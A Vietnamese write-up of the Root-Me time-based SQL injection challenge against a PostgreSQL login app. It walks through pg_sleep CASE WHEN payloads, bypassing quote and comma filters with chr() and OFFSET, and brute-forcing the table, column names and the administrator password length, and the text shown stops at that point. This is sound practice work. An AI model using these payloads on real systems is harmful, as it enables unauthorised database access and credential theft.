# Trần Mạnh Huy - Task3

* [1. SQL injection - Time based](1-sql-injection---time-based)

Vừa vào ta có giao diện:

![image](https://user-images.githubusercontent.com/104350480/221471713-d5066bc2-5f56-4f6a-81e8-098d3d375121.png)

Thử ở phần login nhưng có vẻ kh khai thác được gì, ta sang phần memberlist:

![image](https://user-images.githubusercontent.com/104350480/221471797-8014ce54-8754-4363-bffc-3c3ffd0988fa.png)

Nhấn vào admin với url: **http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1** , vì là dạng time-based nên ta cần test sleep để xem có bị dính sql không. Sau một hồi thử thì ta sleep được vói dạng của nó là postgresql: 

> payload: http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+pg_sleep(10) --

Xác định được rồi giờ ta sẽ đi tìm tên bảng, tên cột và thông tin cần, cụ thể ở đây sẽ là tìm được administrator password với dạng payload chung:

> 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

![image](https://user-images.githubusercontent.com/104350480/221472507-a9b47bc2-01e9-4b72-88ed-6e8226cd219e.png)

Đầu tiên là cần tìm bảng, trước hết thì sẽ làm tìm độ dài của bảng:

> /web-serveur/ch40/?action=member&member=1;+select+case+when+((select+LENGTH(table_name)+from+information_schema.tables+limit+1)+>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+-- 

Đi thử thế này sẽ rất là mất thời gian vì ta đang để limit trả về 1 với offset mặc định là 0, mà chẳng hạn bảng hay cột ta cần tìm ở cột thứ 6 hay 7 chẳng hạn thì thử sẽ mất kha khá thời gian. Mà để hiểu bản chất thì đành vậy.

Với payload trên ta sẽ kiểm tra xem độ dài chính xác của table_name ở hàng 1 là bao nhiêu, test đến khi > 5 kh thấy sleep nữa thì ta được độ dài của bảng là 5.
Với length=5, giờ ta đi tìm tên bảng bằng cách dùng SUBSTRING để đi bruteforce từng kí tự 1, cái này thì dùng burpsuite cho nhanh.
Nhưng đến khi dùng substring để tìm kí tự thì ta lại gặp vấn đề là kh sleep nữa dù payload đã chính xác:

> 1;+select+case+when+(SUBSTRING((select+table_name+from+information_schema.tables+limit+1),1,1)+>+'a')+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Có vẻ '',"" đã bị filter trong bài này, vậy thì ta sẽ chuyển sang dạng chr hoặc hex thử xem:

> 1;+select+case+when+(SUBSTRING((select+table_name+from+information_schema.tables+limit+1),1,1)+>+chr(97))+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Oke vậy là đã sleep được, ta sẽ triển khai tiếp bằng cách bruteforce các kí tự char.

![image](https://user-images.githubusercontent.com/104350480/221474078-c546ad59-df4f-4497-ade5-76b248a4e266.png)

> Sau khi fuzz ta được tên bảng ứng với các kí tự char là: 117,115,101,114,115 chuyển về ta được tên bảng là users

![image](https://user-images.githubusercontent.com/104350480/221477066-6360b685-32f7-4c28-9519-4db0ebadfbaa.png)


Ta có được tên bảng, giờ đi tìm username với password thôi.
Tương tự như trên ta đi xác định column password. Bài này filter cả dấu ',' nên kh thể dùng limit 1,1 hay 2,1 được, ta sẽ thay thế bằng offset với chức năng tượng tự. Thử cái đầu tiên với offset = 1, kh phải cái ta được tên cột là username với payload như bên dưới: 

> payload1: 1;+select+case+when+(select+length(column_name)+from+information_schema.columns+limit+1+offset+1)+>+1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
> payload2: 1;+select+case+when+(substring(select+(column_name)+from+information_schema.columns+limit+1+offset+1),1,1)+=+chr(x))+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Với length = 8 và bruteforce từng kí tự được: 

![image](https://user-images.githubusercontent.com/104350480/221482081-946047e6-2245-42c7-af12-6cc9fd46934e.png)

Tương tự ta cần tìm cột chứa thông tin password, cứ tiếp tục như trên đến khi offset = 5 ta được: 

![image](https://user-images.githubusercontent.com/104350480/221480820-c50769a7-8635-40ad-aa99-53ba1d364f45.png)

Vậy tìm được tên column ở hàng thứ 5 là password với tên bảng usesrs, mục tiêu là tìm password của username là administrator nên ta tiếp tục lấy giá trị của password ra: 

> payload: 1;+select+case+when+((select length(password) from users+limit+1)>1)+then+pg_sleep(20)+else+pg_sleep(0)+end+--

Thử như vậy ta được length của password hàng 1 có độ dài là 13
